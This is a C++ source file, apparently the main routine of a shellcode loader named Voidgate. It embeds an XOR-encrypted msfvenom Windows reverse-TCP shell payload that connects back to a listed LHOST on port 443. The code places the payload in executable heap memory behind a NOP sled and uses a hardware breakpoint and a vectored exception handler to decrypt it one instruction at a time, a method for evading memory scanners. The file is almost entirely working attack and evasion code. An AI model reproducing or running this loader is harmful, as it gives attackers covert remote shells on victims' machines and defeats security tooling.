#include "payload.h"
#include "Voidgate.h"

// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.33 LPORT=443 -f raw  (XORed)
BYTE payload[] = { 0xa5, 0x78, 0xf6, 0xbb, 0x9e, 0xd8, 0x9f, 0x54, 0x34, 0x6b, 0x72, 0xe, 0x22, 0x64, 0x3c, 0x35, 0x3a, 0x7b, 0x10, 0x8b, 0x55, 0x3d, 0xd4, 0x3c, 0x50, 0x17, 0xdf, 0x66, 0x73, 0x7b, 0xd4, 0x31, 0x14, 0x26, 0xef, 0x1e, 0x63, 0x69, 0x56, 0x87, 0x3f, 0x15, 0x23, 0x1, 0x96, 0x1c, 0x5, 0xab, 0x9f, 0x63, 0x2, 0x48, 0x6c, 0x48, 0x4c, 0x72, 0xe0, 0x90, 0x3d, 0x34, 0x5e, 0xaf, 0xd2, 0xb2, 0x6, 0x75, 0x3a, 0x7b, 0xd4, 0x31, 0x14, 0xe5, 0x26, 0x50, 0x7b, 0x20, 0x89, 0xbb, 0xf5, 0xd7, 0x6e, 0x30, 0x5f, 0x1c, 0xb1, 0xab, 0x47, 0x38, 0x2b, 0x35, 0xbe, 0x34, 0xe7, 0x7b, 0x39, 0x1d, 0xbb, 0x35, 0x7f, 0x27, 0x31, 0x8f, 0xb7, 0x62, 0x23, 0xcc, 0x96, 0x22, 0xbf, 0x5a, 0xec, 0x24, 0x32, 0xf7, 0x14, 0x1, 0xbc, 0x17, 0x5f, 0xf0, 0xf3, 0x15, 0xf5, 0xa2, 0x3e, 0x1e, 0x62, 0xf5, 0x56, 0x84, 0x19, 0xc2, 0x6d, 0x5a, 0x7c, 0x51, 0x57, 0x2b, 0x9, 0x8e, 0x21, 0xec, 0x33, 0x77, 0xd4, 0x23, 0x10, 0x27, 0x65, 0xbc, 0x55, 0x60, 0xd2, 0x3c, 0x3d, 0x1b, 0xe5, 0x70, 0x43, 0x1d, 0x35, 0xbb, 0x72, 0xd4, 0x67, 0xbc, 0x26, 0x65, 0xbc, 0x72, 0x79, 0x18, 0x68, 0x2b, 0x6, 0x34, 0x71, 0x7, 0x15, 0x6d, 0x2a, 0x69, 0x17, 0xe0, 0xd8, 0x4e, 0x25, 0x3e, 0xcc, 0xc1, 0x1, 0x71, 0x2c, 0x5, 0x26, 0xbb, 0x4d, 0xbd, 0x63, 0x94, 0xcc, 0xa0, 0x3e, 0x7d, 0xd0, 0x13, 0x1f, 0x1, 0x7e, 0x6a, 0x2, 0x75, 0x5f, 0x2f, 0x66, 0x16, 0xdd, 0xd2, 0x23, 0xb2, 0xb3, 0xc3, 0x35, 0x6e, 0x64, 0x25, 0xba, 0xc4, 0x10, 0x8c, 0x77, 0x5f, 0x6f, 0x8b, 0x9f, 0xfc, 0x50, 0x4a, 0x72, 0xb, 0x2a, 0xbd, 0x8a, 0x28, 0xe5, 0xc2, 0x60, 0xe3, 0x7c, 0x2, 0x79, 0x69, 0xcf, 0x8a, 0x18, 0xbd, 0x81, 0x5b, 0x5e, 0x62, 0x34, 0x6e, 0x3d, 0x2d, 0x89, 0x8, 0xd9, 0x5b, 0x75, 0xa0, 0xbb, 0x60, 0xf, 0x19, 0x5, 0xa2, 0x7e, 0x6e, 0xa3, 0x7c, 0x91, 0xa4, 0x24, 0xba, 0xe3, 0x11, 0xcf, 0xb5, 0x17, 0xe7, 0xf1, 0x1e, 0xee, 0xde, 0x64, 0xec, 0xbf, 0x9c, 0xe1, 0x26, 0xed, 0xab, 0x59, 0x31, 0x18, 0x68, 0x39, 0xd6, 0x8c, 0x78, 0xd6, 0xad, 0x75, 0xd1, 0xaa, 0xfa, 0x17, 0x55, 0x91, 0xb1, 0x24, 0xb2, 0xe5, 0x19, 0x32, 0x75, 0x5f, 0x27, 0x88, 0x3c, 0x39, 0x50, 0x6b, 0x33, 0x5f, 0x63, 0x34, 0x2f, 0x34, 0x2d, 0x63, 0x69, 0xd0, 0xd2, 0x22, 0x8, 0x39, 0x7d, 0x6e, 0x94, 0x5e, 0x66, 0x6a, 0x1e, 0x33, 0xd6, 0x92, 0x2, 0xab, 0x77, 0x5, 0xd, 0x31, 0x74, 0x17, 0xe3, 0x74, 0x7b, 0x4c, 0xf2, 0x6b, 0x5b, 0x17, 0xea, 0xd2, 0x38, 0x34, 0x2d, 0x63, 0x60, 0x9, 0x71, 0x25, 0x16, 0x91, 0xf0, 0x1e, 0x4, 0x7d, 0x94, 0xfb, 0x12, 0xea, 0xf5, 0x22, 0xed, 0xad, 0x72, 0x9b, 0x20, 0xfc, 0x4a, 0xd9, 0x91, 0xe5, 0x17, 0x65, 0xe6, 0x23, 0xcc, 0x95, 0xe8, 0x3a, 0x2f, 0xde, 0x64, 0xb4, 0x3c, 0x39, 0xcf, 0xa0, 0xe4, 0x9e, 0x85, 0xfd, 0x2, 0x75, 0xd1, 0x95, 0xca, 0xde, 0xa9, 0x91, 0xb1, 0x24, 0xb0, 0xe5, 0x71, 0xc, 0x73, 0x23, 0x64, 0xb0, 0xa4, 0xb4, 0x41, 0x6e, 0x88, 0x18, 0x70, 0x46, 0x1, 0xe, 0x6c, 0x6a, 0x60, 0xd0, 0xea, 0x8a, 0x8a };
DWORD payload_size = sizeof(payload);

//XOR key for the encrypted payload
std::string key = "Y0u_n0_T4k3_c4ndl3!";

INT main()
{
    //Calculate the memory_size adding PADDING at the begining and at the end
    DWORD memory_size = SHELLCODE_PADDING + payload_size + SHELLCODE_PADDING;

    //Allocate memory for the payload
    PVOID heap_memory = VirtualAlloc(NULL, memory_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!heap_memory)
    {
        LogWinapiError("VirtualAlloc");
        return EXIT_FAILURE;
    }

    //Calculate the memory bounds of our payload and save them to global var
    payload_lower_bound = (DWORD64)heap_memory;
    payload_upper_bound = payload_lower_bound + memory_size;

    //Fill memory with NOP Sled and copy the payload to the heap memory
    memset(heap_memory, '\x90', memory_size);
    PVOID payload_entry = (PBYTE)heap_memory + SHELLCODE_PADDING;
    memcpy(payload_entry, payload, payload_size);

    payload_base = (DWORD64)payload_entry;

    //Put a HW Breakpoint on our payload entry point
    DWORD status = SetHardwareBreakpoint(payload_entry);

    //Install VEH to handle the payload decryption/encryption after each ASM instruction executed by the payload
    PVOID veh = AddVectoredExceptionHandler(1, &VehDecryptHeapAsm);
    if (veh)
    {
        VoidGate vg = (VoidGate)payload_entry;
        vg();
    }

    //Cleanup
    VirtualFree(heap_memory, 0, MEM_RELEASE);
    return EXIT_SUCCESS;
}